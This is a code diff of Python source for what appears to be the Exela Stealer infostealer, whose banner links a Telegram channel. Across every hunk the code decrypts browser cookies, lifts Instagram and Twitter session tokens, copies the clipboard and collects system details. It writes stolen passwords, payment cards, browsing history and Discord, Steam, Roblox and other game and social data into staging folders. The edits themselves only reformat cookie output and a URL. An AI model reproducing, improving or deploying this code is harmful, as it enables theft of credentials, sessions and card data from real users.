@@ -207,13 +207,8 @@ class QuicaxdExela:
                 for cookie in logins:
                     if cookie[3]:
                         self.cookie += 1
-                        if cookie[4] == 0:
-                            entry = "FALSE"
-                        else:entry= "TRUE"
-                        if str(cookie[0]).startswith('.'):entry2 = "FALSE"
-                        else:entry2='TRUE'
                         cooked = self.decrypt_pw(cookie[3],self.get_encryption_key(value))
-                        self.cookeds.append(f"{cookie[0]}\t{entry}\{cookie[2]}\t{entry2}\t{cookie[1]}\t{cooked}")
+                        self.cookeds.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cooked}")
                         if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
                             self.setInstaSession(cooked, profil_kismi)
                         if "twitter" in str(cookie[0]).lower() and "auth_token" in str(cookie[1]).lower():
@@ -696,7 +691,7 @@ class QuicaxdExela:
             clipboard_data = clipboard.paste()
             if not clipboard_data == "":
                 with open(pathsxd + "\\last_clipboard_text.txt", "a", encoding="utf-8", errors="ignore") as lst:
-                    lst.write("----------------------https://t.me/ExelaStealer/----------------------\n" + "=" * 70 + "\n")
+                    lst.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
                     lst.write(clipboard_data)
         except Exception as e:
             print(str(e))
@@ -714,7 +709,7 @@ class QuicaxdExela:
         run = str(subprocess.check_output(command).decode('utf-8').split("\n")[1].strip())
         tmp = os.getenv('temp')
         with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as x:
-            x.write("----------------------https://t.me/ExelaStealer/----------------------\n" + "=" * 70 + "\n")
+            x.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
         pythoncom.CoInitialize()
         w = wmi.WMI()
         cpu_info = w.Win32_Processor()[0]
@@ -804,79 +799,79 @@ class QuicaxdExela:
             if not self.passws == 0:
                 os.mkdir(tmp + f"\\{run}\\Passwords")
                 with open(tmp + f"\\{run}\\Passwords\\Passwords.txt", "a", encoding="utf-8", errors="ingore") as f:
-                    f.write("----------------------https://t.me/ExelaStealer/----------------------\n" + "=" * 70 + "\n")
+                    f.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
                     for passwss in self.passw:
                         f.write(str(passwss) + "\n")
             if not self.cc == 0:
                 os.mkdir(tmp + f"\\{run}\\Cards")
                 with open(tmp + f"\\{run}\\Cards\\Cards.txt", "a", encoding="utf-8", errors="ingore") as x:
-                    x.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    x.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for uknowwhatiscc in self.ottomonCC:
                         x.write(str(uknowwhatiscc) + "\n")
             if not self.cookie == 0:
                 os.mkdir(tmp + f"\\{run}\\Cookies")
                 with open(tmp + f"\\{run}\\Cookies\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as c:
-                    c.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    c.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for allCookies in self.cookeds:
                         c.write(str(allCookies) + "\n")
             if not self.downloads == 0:
                 os.mkdir(tmp + f"\\{run}\\Downloads")
                 with open(tmp + f"\\{run}\\Downloads\\Downloads.txt", "a", encoding="utf-8", errors="ingore") as d:
-                    d.write("----------------------https://t.me/ExelaStealer/----------------------\n" + "=" * 70 + "\n")
+                    d.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
                     for dwnlds in self.sexDonwloads:
                         d.write(str(dwnlds) + "\n")
             if not self.historys == 0:
                 os.mkdir(tmp + f"\\{run}\\Historys")
                 with open(tmp + f"\\{run}\\Historys\\Historys.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for date in self.sexHistorys:
                         q.write(str(date) + "\n")
             if not self.insta == 0:
                 os.mkdir(tmp + f"\\{run}\\Instagram")
                 with open(tmp + f"\\{run}\\Instagram\\instagram.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for ii in self.instaa:
                         q.write(str(ii) + "\n")
             if not self.twitter == 0:
                 os.mkdir(tmp + f"\\{run}\\Twitter")
                 with open(tmp + f"\\{run}\\Twitter\\Twitter.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for tt in self.twitterr:
                         q.write(str(tt) + "\n")
             if not self.tiktok == 0:
                 os.mkdir(tmp + f"\\{run}\\Tiktok")
                 with open(tmp + f"\\{run}\\Tiktok\\Tiktok.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for ti in self.tiktokk:
                         q.write(str(ti) + "\n")
             if not self.reddit == 0:
                 os.mkdir(tmp + f"\\{run}\\Reddit")
                 with open(tmp + f"\\{run}\\Reddit\\Reddit.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for re in self.redditt:
                         q.write(str(re) + "\n")
             if self.discrod:
                 os.mkdir(tmp + f"\\{run}\\Discord")
                 with open(tmp + f"\\{run}\\Discord\\Discord.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for re in self.discordd:
                         q.write(str(re) + "\n")
             if not self.steam:
                 os.mkdir(tmp + f"\\{run}\\Steam")
                 with open(tmp + f"\\{run}\\Steam\\Steam.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for st in self.steamm:
                         q.write(str(st) + "\n")
             if self.roblox==True:
                 os.mkdir(tmp + f"\\{run}\\Roblox")
                 with open(tmp + f"\\{run}\\Roblox\\Roblox.txt", "a", encoding="utf-8", errors="ignore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for robl in self.robloxx:
                         q.write(str(robl))
             if not self.growtopia == 0:
                 os.mkdir(tmp + f"\\{run}\\Growtopia")
                 with open(tmp + f"\\{run}\\Growtopia\\Growtopia.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for gw in self.growtopiaa:
                         q.write(str(gw) + "\n")
             if 5 < 10:
@@ -908,79 +903,79 @@ class QuicaxdExela:
             if not self.passws == 0:
                 os.mkdir(tmp + f"\\{run}\\Passwords")
                 with open(tmp + f"\\{run}\\Passwords\\Passwords.txt", "a", encoding="utf-8", errors="ingore") as f:
-                    f.write("----------------------https://t.me/ExelaStealer/----------------------\n" + "=" * 70 + "\n")
+                    f.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
                     for passwss in self.passw:
                         f.write(str(passwss) + "\n")
             if not self.cc == 0:
                 os.mkdir(tmp + f"\\{run}\\Cards")
                 with open(tmp + f"\\{run}\\Cards\\Cards.txt", "a", encoding="utf-8", errors="ingore") as x:
-                    x.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    x.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for uknowwhatiscc in self.ottomonCC:
                         x.write(str(uknowwhatiscc) + "\n")
             if not self.cookie == 0:
                 os.mkdir(tmp + f"\\{run}\\Cookies")
                 with open(tmp + f"\\{run}\\Cookies\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as c:
-                    c.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    c.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for allCookies in self.cookeds:
                         c.write(str(allCookies) + "\n")
             if not self.downloads == 0:
                 os.mkdir(tmp + f"\\{run}\\Downloads")
                 with open(tmp + f"\\{run}\\Downloads\\Downloads.txt", "a", encoding="utf-8", errors="ingore") as d:
-                    d.write("----------------------https://t.me/ExelaStealer/----------------------\n" + "=" * 70 + "\n")
+                    d.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
                     for dwnlds in self.sexDonwloads:
                         d.write(str(dwnlds) + "\n")
             if not self.historys == 0:
                 os.mkdir(tmp + f"\\{run}\\Historys")
                 with open(tmp + f"\\{run}\\Historys\\Historys.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for date in self.sexHistorys:
                         q.write(str(date) + "\n")
             if not self.insta == 0:
                 os.mkdir(tmp + f"\\{run}\\Instagram")
                 with open(tmp + f"\\{run}\\Instagram\\instagram.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for ii in self.instaa:
                         q.write(str(ii) + "\n")
             if not self.twitter == 0:
                 os.mkdir(tmp + f"\\{run}\\Twitter")
                 with open(tmp + f"\\{run}\\Twitter\\Twitter.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for tt in self.twitterr:
                         q.write(str(tt) + "\n")
             if not self.tiktok == 0:
                 os.mkdir(tmp + f"\\{run}\\Tiktok")
                 with open(tmp + f"\\{run}\\Tiktok\\Tiktok.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for ti in self.tiktokk:
                         q.write(str(ti) + "\n")
             if not self.reddit == 0:
                 os.mkdir(tmp + f"\\{run}\\Reddit")
                 with open(tmp + f"\\{run}\\Reddit\\Reddit.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for re in self.redditt:
                         q.write(str(re) + "\n")
             if self.discrod:
                 os.mkdir(tmp + f"\\{run}\\Discord")
                 with open(tmp + f"\\{run}\\Discord\\Discord.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for re in self.discordd:
                         q.write(str(re) + "\n")
             if not self.steamm == 0:
                 os.mkdir(tmp + f"\\{run}\\Steam")
                 with open(tmp + f"\\{run}\\Steam\\Steam.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for st in self.steamm:
                         q.write(str(st) + "\n")
             if self.roblox==True:
                 os.mkdir(tmp + f"\\{run}\\Roblox")
                 with open(tmp + f"\\{run}\\Roblox\\Roblox.txt", "a", encoding="utf-8", errors="ignore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for robl in self.robloxx:
                         q.write(str(robl))
             if not self.growtopia == 0:
                 os.mkdir(tmp + f"\\{run}\\Growtopia")
                 with open(tmp + f"\\{run}\\Growtopia\\Growtopia.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for gw in self.growtopiaa:
                         q.write(str(gw) + "\n")
             if 5 < 10:
